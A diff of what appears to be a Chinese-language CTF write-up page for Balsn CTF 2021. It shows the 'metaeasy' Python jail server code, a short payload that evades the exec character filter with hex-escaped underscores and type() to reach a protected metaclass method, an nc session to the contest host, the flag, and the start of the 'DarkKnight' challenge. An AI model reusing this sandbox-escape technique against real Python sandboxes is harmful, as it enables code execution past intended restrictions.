@@ -18,153 +18,178 @@ Nov 22, 2021
     <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(<span style=color:#f92672>*</span>argv):
         print(<span style=color:#e6db74>&#39;Bad guy! No Flag !!&#39;</span>)
         <span style=color:#66d9ef>raise</span> <span style=color:#e6db74>&#39;Illegal&#39;</span>
-<p><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>BalsnMetaClass</span>(type):
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getFlag</span>(self):
-print(<span style=color:#e6db74>'You</span><span style=color:#ae81ff>&amp;#39;</span><span style=color:#e6db74>re not Master! No Flag !!'</span>)</p>
-<pre><code>&lt;span style=&quot;color:#66d9ef&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#a6e22e&quot;&gt;__new__&lt;/span&gt;(cls, class_name, class_parents, class_attr):
-    newclass &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; super()&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;__new__(cls, class_name, class_parents, class_attr)
-    setattr(newclass, cls&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;getFlag&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;__name__, cls&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;getFlag)
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;return&lt;/span&gt; newclass
-</code></pre><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>secure_vars</span>(s):
-attrs <span style=color:#f92672>=</span> {name:value <span style=color:#66d9ef>for</span> name, value <span style=color:#f92672>in</span> vars(s)<span style=color:#f92672>.</span>items() <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> name<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>'__'</span>)}
-<span style=color:#66d9ef>return</span> attrs</p><p>safe_dict <span style=color:#f92672>=</span> {
-<span style=color:#e6db74>'BalsnMetaClass'</span> : BalsnMetaClass,
-<span style=color:#e6db74>'MasterMetaClass'</span> : MasterMetaClass,
-<span style=color:#e6db74>'False'</span> : <span style=color:#66d9ef>False</span>,
-<span style=color:#e6db74>'True'</span> : <span style=color:#66d9ef>True</span>,
-<span style=color:#e6db74>'abs'</span> : abs,
-<span style=color:#e6db74>'all'</span> : all,
-<span style=color:#e6db74>'any'</span> : any,
-<span style=color:#e6db74>'ascii'</span> : ascii,
-<span style=color:#e6db74>'bin'</span> : bin,
-<span style=color:#e6db74>'bool'</span> : bool,
-<span style=color:#e6db74>'bytearray'</span> : bytearray,
-<span style=color:#e6db74>'bytes'</span> : bytes,
-<span style=color:#e6db74>'chr'</span> : chr,
-<span style=color:#e6db74>'complex'</span> : complex,
-<span style=color:#e6db74>'dict'</span> : dict,
-<span style=color:#e6db74>'dir'</span> : dir,
-<span style=color:#e6db74>'divmod'</span> : divmod,
-<span style=color:#e6db74>'enumerate'</span> : enumerate,
-<span style=color:#e6db74>'filter'</span> : filter,
-<span style=color:#e6db74>'float'</span> : float,
-<span style=color:#e6db74>'format'</span> : format,
-<span style=color:#e6db74>'hash'</span> : hash,
-<span style=color:#e6db74>'help'</span> : help,
-<span style=color:#e6db74>'hex'</span> : hex,
-<span style=color:#e6db74>'id'</span> : id,
-<span style=color:#e6db74>'int'</span> : int,
-<span style=color:#e6db74>'iter'</span> : iter,
-<span style=color:#e6db74>'len'</span> : len,
-<span style=color:#e6db74>'list'</span> : list,
-<span style=color:#e6db74>'map'</span> : map,
-<span style=color:#e6db74>'max'</span> : max,
-<span style=color:#e6db74>'min'</span> : min,
-<span style=color:#e6db74>'next'</span> : next,
-<span style=color:#e6db74>'oct'</span> : oct,
-<span style=color:#e6db74>'ord'</span> : ord,
-<span style=color:#e6db74>'pow'</span> : pow,
-<span style=color:#e6db74>'print'</span> : print,
-<span style=color:#e6db74>'range'</span> : range,
-<span style=color:#e6db74>'reversed'</span> : reversed,
-<span style=color:#e6db74>'round'</span> : round,
-<span style=color:#e6db74>'set'</span> : set,
-<span style=color:#e6db74>'slice'</span> : slice,
-<span style=color:#e6db74>'sorted'</span> : sorted,
-<span style=color:#e6db74>'str'</span> : str,
-<span style=color:#e6db74>'sum'</span> : sum,
-<span style=color:#e6db74>'tuple'</span> : tuple,
-<span style=color:#e6db74>'type'</span> : type,
-<span style=color:#e6db74>'vars'</span> : secure_vars,
-<span style=color:#e6db74>'zip'</span> : zip,
-<span style=color:#e6db74>'<strong>builtins</strong>'</span>:<span style=color:#66d9ef>None</span>
-}</p><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>createMethod</span>(code):
-<span style=color:#66d9ef>if</span> len(code) <span style=color:#f92672>></span> <span style=color:#ae81ff>45</span>:
-print(<span style=color:#e6db74>'Too long!! Bad Guy!!'</span>)
-<span style=color:#66d9ef>return</span>
-<span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> <span style=color:#e6db74>' _$#@~'</span>:
-code <span style=color:#f92672>=</span> code<span style=color:#f92672>.</span>replace(x,<span style=color:#e6db74>''</span>)
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>wrapper</span>(self):
-exec(code, safe_dict, {<span style=color:#e6db74>'self'</span> : self})
-<span style=color:#66d9ef>return</span> wrapper</p><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setName</span>(pattern):
-<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
-name <span style=color:#f92672>=</span> input(f<span style=color:#e6db74>'Give me your </span><span style=color:#e6db74>{pattern}</span><span style=color:#e6db74> name :'</span>)
-<span style=color:#66d9ef>if</span> (name<span style=color:#f92672>.</span>isalpha()):
-<span style=color:#66d9ef>break</span>
-<span style=color:#66d9ef>else</span>:
-print(<span style=color:#e6db74>'Illegal Name&mldr;'</span>)
-<span style=color:#66d9ef>return</span> name</p><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setAttribute</span>(cls):
-attrName <span style=color:#f92672>=</span> setName(<span style=color:#e6db74>'attribute'</span>)
-<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
-attrValue <span style=color:#f92672>=</span> input(f<span style=color:#e6db74>'Give me your value:'</span>)
-<span style=color:#66d9ef>if</span> (attrValue<span style=color:#f92672>.</span>isalnum()):
-<span style=color:#66d9ef>break</span>
-<span style=color:#66d9ef>else</span>:<br>print(<span style=color:#e6db74>'Illegal value&mldr;'</span>)
-setattr(cls, attrName, attrValue)</p><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setMethod</span>(cls):
-methodName <span style=color:#f92672>=</span> setName(<span style=color:#e6db74>'method'</span>)
-code <span style=color:#f92672>=</span> input(f<span style=color:#e6db74>'Give me your function:'</span>)<br>func <span style=color:#f92672>=</span> createMethod(code)
-setattr(cls, methodName, func)</p><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getAttribute</span>(obj):
-attrs <span style=color:#f92672>=</span> [attr <span style=color:#66d9ef>for</span> attr <span style=color:#f92672>in</span> dir(obj) <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> callable(getattr(obj, attr)) <span style=color:#f92672>and</span> <span style=color:#f92672>not</span> attr<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>"__"</span>)]
-x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>'Please enter the attribute</span><span style=color:#ae81ff>&amp;#39;</span><span style=color:#e6db74>s name :'</span>)
-<span style=color:#66d9ef>if</span> x <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> attrs:
-print(f<span style=color:#e6db74>'You can</span><span style=color:#ae81ff>&amp;#39;</span><span style=color:#e6db74>t access the attribute </span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>'</span>)
-<span style=color:#66d9ef>return</span>
-<span style=color:#66d9ef>else</span>:
-<span style=color:#66d9ef>try</span>:
-print(f<span style=color:#e6db74>'</span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>: {getattr(obj, x)}'</span>)
-<span style=color:#66d9ef>except</span>:
-print(<span style=color:#e6db74>"Something went wrong in your attribute&mldr;"</span>)
-<span style=color:#66d9ef>return</span></p><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>callMethod</span>(cls, obj):
-attrs <span style=color:#f92672>=</span> [attr <span style=color:#66d9ef>for</span> attr <span style=color:#f92672>in</span> dir(obj) <span style=color:#66d9ef>if</span> callable(getattr(obj, attr)) <span style=color:#f92672>and</span> <span style=color:#f92672>not</span> attr<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>"__"</span>)]
-x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>'Please enter the method</span><span style=color:#ae81ff>&amp;#39;</span><span style=color:#e6db74>s name :'</span>)
-<span style=color:#66d9ef>if</span> x <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> attrs:
-print(f<span style=color:#e6db74>'You can</span><span style=color:#ae81ff>&amp;#39;</span><span style=color:#e6db74>t access the method </span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>'</span>)
-<span style=color:#66d9ef>return</span>
-<span style=color:#66d9ef>else</span>:
-<span style=color:#66d9ef>try</span>:
-print(f<span style=color:#e6db74>'calling method </span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>&mldr;'</span>)
-cls<span style=color:#f92672>.</span><strong>dict</strong><a href=obj>x</a>
-print(<span style=color:#e6db74>'done'</span>)
-<span style=color:#66d9ef>except</span>:
-print(<span style=color:#e6db74>'Something went wrong in your method&mldr;'</span>)
-<span style=color:#66d9ef>return</span></p><p><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Guest</span>(metaclass <span style=color:#f92672>=</span> BalsnMetaClass):
-<span style=color:#66d9ef>pass</span></p><p><span style=color:#66d9ef>if</span> <strong>name</strong> <span style=color:#f92672>==</span> <span style=color:#e6db74>'<strong>main</strong>'</span>:
-print(f<span style=color:#e6db74>'Welcome!!We have prepared a class named "Guest" for you'</span>)
-cnt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-<span style=color:#66d9ef>while</span> cnt <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>:
-cnt <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-print(<span style=color:#e6db74>'1. Add attribute'</span>)
-print(<span style=color:#e6db74>'2. Add method'</span>)
-print(<span style=color:#e6db74>'3. Finish'</span>)
-x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>"Option ? :"</span>)
-<span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>"1"</span>:
-setAttribute(Guest)
-<span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>"2"</span>:
-setMethod(Guest)
-<span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>"3"</span>:
-<span style=color:#66d9ef>break</span>
-<span style=color:#66d9ef>else</span>:
-print(<span style=color:#e6db74>"invalid input."</span>)
-cnt <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
-print(<span style=color:#e6db74>"Well Done! We Create an instance for you !"</span>)
-obj <span style=color:#f92672>=</span> Guest()
-cnt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-<span style=color:#66d9ef>while</span> cnt <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>:
-cnt <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-print(<span style=color:#e6db74>'1. Inspect attribute'</span>)
-print(<span style=color:#e6db74>'2. Using method'</span>)
-print(<span style=color:#e6db74>'3. Exit'</span>)
-x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>"Option ? :"</span>)
-<span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>"1"</span>:
-getAttribute(obj)
-<span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>"2"</span>:
-callMethod(Guest, obj)
-<span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>"3"</span>:
-print(<span style=color:#e6db74>"Okay&mldr;exit&mldr;"</span>)
-<span style=color:#66d9ef>break</span>
-<span style=color:#66d9ef>else</span>:
-print(<span style=color:#e6db74>"invalid input."</span>)
-cnt <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span></p><p></code></pre></div><h3 id=目標>目標</h3></p><p>使用MasterMetaClass這個MetaClass建立一個class並調用裡面的IWantGETFLAGPlz func</p><h3 id=限制>限制</h3><ul><li>payload 不可超過三行</li><li>payload 一行要低於45字</li><li>payload 不可含[' &lsquo;, &lsquo;_&rsquo;, &lsquo;$&rsquo;, &lsquo;#&rsquo;, &lsquo;@&rsquo;, &lsquo;~']字元</li></ul><h3 id=payload>payload</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>a<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>decode();self<span style=color:#f92672>.</span>i<span style=color:#f92672>=</span>a<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;init&#39;</span><span style=color:#f92672>+</span>a
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>BalsnMetaClass</span>(type):
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getFlag</span>(self):
+        print(<span style=color:#e6db74>&#39;You</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>re not Master! No Flag !!&#39;</span>)
+
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__new__</span>(cls, class_name, class_parents, class_attr):
+        newclass <span style=color:#f92672>=</span> super()<span style=color:#f92672>.</span>__new__(cls, class_name, class_parents, class_attr)
+        setattr(newclass, cls<span style=color:#f92672>.</span>getFlag<span style=color:#f92672>.</span>__name__, cls<span style=color:#f92672>.</span>getFlag)
+        <span style=color:#66d9ef>return</span> newclass
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>secure_vars</span>(s):
+    attrs <span style=color:#f92672>=</span> {name:value <span style=color:#66d9ef>for</span> name, value <span style=color:#f92672>in</span> vars(s)<span style=color:#f92672>.</span>items() <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> name<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;__&#39;</span>)}
+    <span style=color:#66d9ef>return</span> attrs
+
+safe_dict <span style=color:#f92672>=</span> {
+            <span style=color:#e6db74>&#39;BalsnMetaClass&#39;</span> : BalsnMetaClass,
+            <span style=color:#e6db74>&#39;MasterMetaClass&#39;</span> : MasterMetaClass,
+            <span style=color:#e6db74>&#39;False&#39;</span> : <span style=color:#66d9ef>False</span>,
+            <span style=color:#e6db74>&#39;True&#39;</span> : <span style=color:#66d9ef>True</span>,
+            <span style=color:#e6db74>&#39;abs&#39;</span> : abs,
+            <span style=color:#e6db74>&#39;all&#39;</span> : all,
+            <span style=color:#e6db74>&#39;any&#39;</span> : any,
+            <span style=color:#e6db74>&#39;ascii&#39;</span> : ascii,
+            <span style=color:#e6db74>&#39;bin&#39;</span> : bin,
+            <span style=color:#e6db74>&#39;bool&#39;</span> : bool,
+            <span style=color:#e6db74>&#39;bytearray&#39;</span> : bytearray,
+            <span style=color:#e6db74>&#39;bytes&#39;</span> : bytes,
+            <span style=color:#e6db74>&#39;chr&#39;</span> : chr,
+            <span style=color:#e6db74>&#39;complex&#39;</span> : complex,
+            <span style=color:#e6db74>&#39;dict&#39;</span> : dict,
+            <span style=color:#e6db74>&#39;dir&#39;</span> : dir,
+            <span style=color:#e6db74>&#39;divmod&#39;</span> : divmod,
+            <span style=color:#e6db74>&#39;enumerate&#39;</span> : enumerate,
+            <span style=color:#e6db74>&#39;filter&#39;</span> : filter,
+            <span style=color:#e6db74>&#39;float&#39;</span> : float,
+            <span style=color:#e6db74>&#39;format&#39;</span> : format,
+            <span style=color:#e6db74>&#39;hash&#39;</span> : hash,
+            <span style=color:#e6db74>&#39;help&#39;</span> : help,
+            <span style=color:#e6db74>&#39;hex&#39;</span> : hex,
+            <span style=color:#e6db74>&#39;id&#39;</span> : id,
+            <span style=color:#e6db74>&#39;int&#39;</span> : int,
+            <span style=color:#e6db74>&#39;iter&#39;</span> : iter,
+            <span style=color:#e6db74>&#39;len&#39;</span> : len,
+            <span style=color:#e6db74>&#39;list&#39;</span> : list,
+            <span style=color:#e6db74>&#39;map&#39;</span> : map,
+            <span style=color:#e6db74>&#39;max&#39;</span> : max,
+            <span style=color:#e6db74>&#39;min&#39;</span> : min,
+            <span style=color:#e6db74>&#39;next&#39;</span> : next,
+            <span style=color:#e6db74>&#39;oct&#39;</span> : oct,
+            <span style=color:#e6db74>&#39;ord&#39;</span> : ord,
+            <span style=color:#e6db74>&#39;pow&#39;</span> : pow,
+            <span style=color:#e6db74>&#39;print&#39;</span> : print,
+            <span style=color:#e6db74>&#39;range&#39;</span> : range,
+            <span style=color:#e6db74>&#39;reversed&#39;</span> : reversed,
+            <span style=color:#e6db74>&#39;round&#39;</span> : round,
+            <span style=color:#e6db74>&#39;set&#39;</span> : set,
+            <span style=color:#e6db74>&#39;slice&#39;</span> : slice,
+            <span style=color:#e6db74>&#39;sorted&#39;</span> : sorted,
+            <span style=color:#e6db74>&#39;str&#39;</span> : str,
+            <span style=color:#e6db74>&#39;sum&#39;</span> : sum,
+            <span style=color:#e6db74>&#39;tuple&#39;</span> : tuple,
+            <span style=color:#e6db74>&#39;type&#39;</span> : type,
+            <span style=color:#e6db74>&#39;vars&#39;</span> : secure_vars,
+            <span style=color:#e6db74>&#39;zip&#39;</span> : zip,
+            <span style=color:#e6db74>&#39;__builtins__&#39;</span>:<span style=color:#66d9ef>None</span>
+            }
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>createMethod</span>(code):
+    <span style=color:#66d9ef>if</span> len(code) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>45</span>:
+        print(<span style=color:#e6db74>&#39;Too long!! Bad Guy!!&#39;</span>)
+        <span style=color:#66d9ef>return</span>
+    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> <span style=color:#e6db74>&#39; _$#@~&#39;</span>:
+        code <span style=color:#f92672>=</span> code<span style=color:#f92672>.</span>replace(x,<span style=color:#e6db74>&#39;&#39;</span>)
+    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>wrapper</span>(self):
+        exec(code, safe_dict, {<span style=color:#e6db74>&#39;self&#39;</span> : self})
+    <span style=color:#66d9ef>return</span> wrapper
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setName</span>(pattern):
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        name <span style=color:#f92672>=</span> input(f<span style=color:#e6db74>&#39;Give me your </span><span style=color:#e6db74>{pattern}</span><span style=color:#e6db74> name :&#39;</span>)
+        <span style=color:#66d9ef>if</span> (name<span style=color:#f92672>.</span>isalpha()):
+            <span style=color:#66d9ef>break</span>
+        <span style=color:#66d9ef>else</span>:
+            print(<span style=color:#e6db74>&#39;Illegal Name...&#39;</span>)
+    <span style=color:#66d9ef>return</span> name
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setAttribute</span>(cls):
+    attrName <span style=color:#f92672>=</span> setName(<span style=color:#e6db74>&#39;attribute&#39;</span>)
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        attrValue <span style=color:#f92672>=</span> input(f<span style=color:#e6db74>&#39;Give me your value:&#39;</span>)
+        <span style=color:#66d9ef>if</span> (attrValue<span style=color:#f92672>.</span>isalnum()):
+            <span style=color:#66d9ef>break</span>
+        <span style=color:#66d9ef>else</span>:    
+            print(<span style=color:#e6db74>&#39;Illegal value...&#39;</span>)
+    setattr(cls, attrName, attrValue)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setMethod</span>(cls):
+    methodName <span style=color:#f92672>=</span> setName(<span style=color:#e6db74>&#39;method&#39;</span>)
+    code <span style=color:#f92672>=</span> input(f<span style=color:#e6db74>&#39;Give me your function:&#39;</span>)       
+    func <span style=color:#f92672>=</span> createMethod(code)
+    setattr(cls, methodName, func)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getAttribute</span>(obj):
+    attrs <span style=color:#f92672>=</span> [attr <span style=color:#66d9ef>for</span> attr <span style=color:#f92672>in</span> dir(obj) <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> callable(getattr(obj, attr)) <span style=color:#f92672>and</span> <span style=color:#f92672>not</span> attr<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;__&#34;</span>)]
+    x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#39;Please enter the attribute</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>s name :&#39;</span>)
+    <span style=color:#66d9ef>if</span> x <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> attrs:
+        print(f<span style=color:#e6db74>&#39;You can</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>t access the attribute </span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>&#39;</span>)
+        <span style=color:#66d9ef>return</span>
+    <span style=color:#66d9ef>else</span>:
+        <span style=color:#66d9ef>try</span>:
+            print(f<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>: {getattr(obj, x)}&#39;</span>)
+        <span style=color:#66d9ef>except</span>:
+            print(<span style=color:#e6db74>&#34;Something went wrong in your attribute...&#34;</span>)
+            <span style=color:#66d9ef>return</span>
+    
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>callMethod</span>(cls, obj):
+    attrs <span style=color:#f92672>=</span> [attr <span style=color:#66d9ef>for</span> attr <span style=color:#f92672>in</span> dir(obj) <span style=color:#66d9ef>if</span> callable(getattr(obj, attr)) <span style=color:#f92672>and</span> <span style=color:#f92672>not</span> attr<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;__&#34;</span>)]
+    x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#39;Please enter the method</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>s name :&#39;</span>)
+    <span style=color:#66d9ef>if</span> x <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> attrs:
+        print(f<span style=color:#e6db74>&#39;You can</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>t access the method </span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>&#39;</span>)
+        <span style=color:#66d9ef>return</span>
+    <span style=color:#66d9ef>else</span>:
+        <span style=color:#66d9ef>try</span>:
+            print(f<span style=color:#e6db74>&#39;calling method </span><span style=color:#e6db74>{x}</span><span style=color:#e6db74>...&#39;</span>)
+            cls<span style=color:#f92672>.</span>__dict__[x](obj)
+            print(<span style=color:#e6db74>&#39;done&#39;</span>)
+        <span style=color:#66d9ef>except</span>:
+            print(<span style=color:#e6db74>&#39;Something went wrong in your method...&#39;</span>)
+            <span style=color:#66d9ef>return</span>
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Guest</span>(metaclass <span style=color:#f92672>=</span> BalsnMetaClass):
+    <span style=color:#66d9ef>pass</span>
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+    print(f<span style=color:#e6db74>&#39;Welcome!!We have prepared a class named &#34;Guest&#34; for you&#39;</span>)
+    cnt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+    <span style=color:#66d9ef>while</span> cnt <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>:
+        cnt <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+        print(<span style=color:#e6db74>&#39;1. Add attribute&#39;</span>)
+        print(<span style=color:#e6db74>&#39;2. Add method&#39;</span>)
+        print(<span style=color:#e6db74>&#39;3. Finish&#39;</span>)
+        x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Option ? :&#34;</span>)
+        <span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>:
+            setAttribute(Guest)
+        <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;2&#34;</span>:
+            setMethod(Guest)
+        <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;3&#34;</span>:
+            <span style=color:#66d9ef>break</span>
+        <span style=color:#66d9ef>else</span>:
+            print(<span style=color:#e6db74>&#34;invalid input.&#34;</span>)
+            cnt <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
+    print(<span style=color:#e6db74>&#34;Well Done! We Create an instance for you !&#34;</span>)
+    obj <span style=color:#f92672>=</span> Guest()
+    cnt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+    <span style=color:#66d9ef>while</span> cnt <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>:
+        cnt <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+        print(<span style=color:#e6db74>&#39;1. Inspect attribute&#39;</span>)
+        print(<span style=color:#e6db74>&#39;2. Using method&#39;</span>)
+        print(<span style=color:#e6db74>&#39;3. Exit&#39;</span>)
+        x <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Option ? :&#34;</span>)
+        <span style=color:#66d9ef>if</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>:
+            getAttribute(obj)
+        <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;2&#34;</span>:
+            callMethod(Guest, obj)
+        <span style=color:#66d9ef>elif</span> x <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;3&#34;</span>:
+            print(<span style=color:#e6db74>&#34;Okay...exit...&#34;</span>)
+            <span style=color:#66d9ef>break</span>
+        <span style=color:#66d9ef>else</span>:
+            print(<span style=color:#e6db74>&#34;invalid input.&#34;</span>)
+            cnt <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
+
+</code></pre></div><h3 id=目標>目標</h3><p>使用MasterMetaClass這個MetaClass建立一個class並調用裡面的IWantGETFLAGPlz func</p><h3 id=限制>限制</h3><ul><li>payload 不可超過三行</li><li>payload 一行要低於45字</li><li>payload 不可含[' &lsquo;, &lsquo;_&rsquo;, &lsquo;$&rsquo;, &lsquo;#&rsquo;, &lsquo;@&rsquo;, &lsquo;~']字元</li></ul><h3 id=payload>payload</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3>a<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>decode();self<span style=color:#f92672>.</span>i<span style=color:#f92672>=</span>a<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;init&#39;</span><span style=color:#f92672>+</span>a
 self<span style=color:#f92672>.</span>d<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;&#39;</span>,(MasterMetaClass,),{self<span style=color:#f92672>.</span>i:print}]
 type(<span style=color:#f92672>*</span>self<span style=color:#f92672>.</span>d)(<span style=color:#e6db74>&#39;&#39;</span>,(),{})()<span style=color:#f92672>.</span>IWantGETFLAGPlz()
 </code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@jimmyGW:~# nc metaeasy.balsnctf.com <span style=color:#ae81ff>19092</span>
@@ -214,205 +239,228 @@ Please enter the method<span style=color:#e6db74>&#39;s name :ccc
 <span style=color:#66d9ef>done</span>
 </code></pre></div><h3 id=flag>flag</h3><p>BALSN{Metaclasses_Are_Deeper_Magic_Than_99%_Of_Users_Should_Ever_Worry_About._If_You_Wonder_Whether_You_Need_Them,_You_Don&rsquo;t.-Tim_Peters_DE8560A2}</p><h3 id=參考>參考</h3><p><a href=https://dboyliao.medium.com/%E6%B7%BA%E8%AB%87-python-metaclass-dfacf24d6dd5>淺談 Python Metaclass</a></p><h2 id=darkknight>DarkKnight</h2><h3 id=題目-1>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/142795120-ce0a446a-5e10-4998-bd33-1f72ad9d4eea.png alt=image></p><h3 id=server-code-1>server code</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3><span style=color:#f92672>import</span> os
 <span style=color:#f92672>import</span> shutil
-<p>base_dir <span style=color:#f92672>=</span> f<span style=color:#e6db74>&quot;C:</span><span style=color:#ae81ff>\</span><span style=color:#e6db74>Users</span><span style=color:#ae81ff>\</span><span style=color:#e6db74>balsnctf</span><span style=color:#ae81ff>\</span><span style=color:#e6db74>Documents</span><span style=color:#ae81ff>\</span><span style=color:#e6db74>Dark Knight</span><span style=color:#ae81ff>\</span><span style=color:#e6db74>tmp-{os.urandom(16).hex()}&quot;</span></p>
-<p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>init</span>():
-os<span style=color:#f92672>.</span>mkdir(base_dir)
-os<span style=color:#f92672>.</span>chdir(base_dir)</p>
